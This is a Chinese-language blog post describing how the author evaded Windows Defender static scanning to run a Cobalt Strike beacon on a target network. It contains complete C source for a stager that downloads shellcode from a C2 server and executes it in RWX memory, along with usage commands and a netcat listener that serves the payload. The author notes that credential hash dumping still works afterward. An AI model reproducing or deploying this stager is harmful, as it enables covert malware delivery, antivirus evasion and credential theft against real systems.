---
layout: post
title: Beacon-绕过windows defender
date: 2019-09-07 23:30:00
tags: Windows Defender
categories: hack
author: PythonPig
---
* content
{:toc}

### \#0x00 写在前面 
最近工作实在是太忙了，一直想找时间把这篇文章写出来，无奈工作压力太大一直没能抽出时间。今天趁这个周末的晚上把这篇文章写完吧。  
之前用CS时习惯性的用windows dll，在windows server 2008 R2上一直运行的很不错，前段时间发现目标网络内部分操作系统升级到了windows server 2016，windows defender也升级到了最新版本，可想而知，没有经过第三方处理的CS beacon payload传上去之后瞬间就被秒了~~，果断google看看有没有好的解决办法，果然搜到了不少解决办法（具体见《参考》部分），今天只研究如何绕过静态扫描，以后补充如何绕过内存扫描、流量分析、行为分析，绕过静态扫描的方法：加密、混淆、截断拼接、payload字符（敏感字符或全部字符）替换、文件不落地等等，不过人怕出名猪怕壮，很多方法已经无法绕过windows defender的检测了。  
{:refdef: style="text-align: center;"}
![windows defender](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Beacon-绕过windows%20defender/windows%20defender.jpg?raw=true)
{: refdef}
图片来源于https://tweaklibrary.com/how-banking-trojan-disables-windows-defender-on-windows-10/



### \#0x01 尝试绕过 
在测试绕过windows defender的静态扫描时，首先使用了[Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)，结果Obfuscation的部分文件直接被windows defender报毒了，关了defender继续使用Obfuscation把cs的payload进行了混淆，结果，还是绕不过defender的静态扫描；后来使用了[Veil](https://github.com/Veil-Framework/Veil)加密CS的Veil payload，结果可以绕过相当一部分杀软的静态扫描，但是还是过不了最新版的defender静态扫描。    

Obfuscation和Veil的失败充分说明了什么叫“人怕出名猪怕壮”的道理。    

竟然混淆、加密都过不了defender的静态扫描，那尝试使用“文件不落地”的方式来绕过defender。  

思路如下：  
编写一个简单的stager，这个stager仅用于申请内存、下载payload并执行，该stager本身并不包含恶意代码，因此可以绕过windows defender的静态扫描。  

##### 1、编写stager
首先编写stager用于远程下载payload并执行，这个stager是一个TCP客户端，从我们的C2服务器下载payload、申请内存、执行payload。代码如下(Visual Studio 2010编译)：  
```
#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <Windows.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )


int main(int argc, char *argv[])
{    
	// Declare and initialize variables
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
   

	if (argc != 3) {
        fprintf(stderr,"usage: stager.exe hostname port\n");
        exit(0);
    }
	struct hostent *host;
    if ((host=gethostbyname(argv[1])) == NULL) {  /* get the host info */			
        puts("Get IP address error!");     
        exit(0);
    }
	
	int port = 0;
	if ((port = atoi(argv[2])) == NULL) {  /* get the port info */
        puts("Get port error!");     
        exit(0);
    }

    SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sclient == INVALID_SOCKET)
    {
        printf("invalid socket !");
        return 0;
    }

    sockaddr_in serAddr;
    serAddr.sin_family = AF_INET;
    serAddr.sin_port = htons(port);
	serAddr.sin_addr = *((struct in_addr *)host->h_addr);
	
    if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
    {
        printf("connect error !");
        closesocket(sclient);
        return 0;
    }  
    char recData[1024];
    int receivedBytes = recv(sclient, recData, sizeof(recData), 0);
	printf("received:%d\n",receivedBytes);
    if(receivedBytes > 0)
    {      
		LPVOID shellcode = VirtualAlloc(NULL, receivedBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);	
		printf("Allocated memory for shellocode at:%p\n",shellcode);
	
		memcpy(shellcode, recData, sizeof(recData));	
		printf("Copied shellcode to:%p,Sending back meterpreter session...\n",shellcode);
		((void(*)()) shellcode)();
    }
    closesocket(sclient);
    WSACleanup();	
    return 0;
}
```
stager生成之后，上传至目标机器并执行，执行方式如：stager.exe c2_hostname port  
```
stager.exe www.xxxxxx.com 53    //使用域名方式
stager.exe 8.8.x.x 8080         //使用IP方式
```

##### 2、生成CS payload并在C2服务器启动TCP Server
使用CS生成payload  
{:refdef: style="text-align: center;"}
![生成payload](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Beacon-绕过windows%20defender/生成payload.png?raw=true)
{: refdef}   

在C2服务器上开启TCP Server，为了方便起见，直接使用netcat  
```
echo -e "\xfc\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x00\x00\x00\x00\x00" | nc -l -p 53 -vvv
```
其中“\xfc\xxx\xxx\……\x00"为CS生成的payload。  

##### 3、目标上线
stager在目标机器上执行后，stager将在C2服务器下载payload并执行，目标上线。注意，虽然绕过了windows defender的静态扫描，但仍然需要小心defender的行为检测，比如利用beacon session进行提权、调用mimikatz时都会被defender检测到，不过dump hashes、proxy server等功能是可以正常执行的。  


### \#0x03 参考
* [渗透利器Cobalt Strike - 第2篇 APT级的全面免杀与企业纵深防御体系的对抗](https://xz.aliyun.com/t/4191#toc-5)
* [Bypassing Windows Defender: One TCP Socket Away From Meterpreter and Beacon Sessions](https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon#code) 
* [Cobalt Strike – Bypassing Windows Defender with Obfuscation](http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/)
* [Evading Windows Defender with 1 Byte Change](https://ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change)  
* [I rolled my own crypto to work around](https://twitter.com/curi0usJack/status/1083470829290164227?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1083470829290164227&ref_url=https%3A%2F%2Ftwitter.com%2Fcuri0usJack%2Fstatus%2F1083470829290164227) 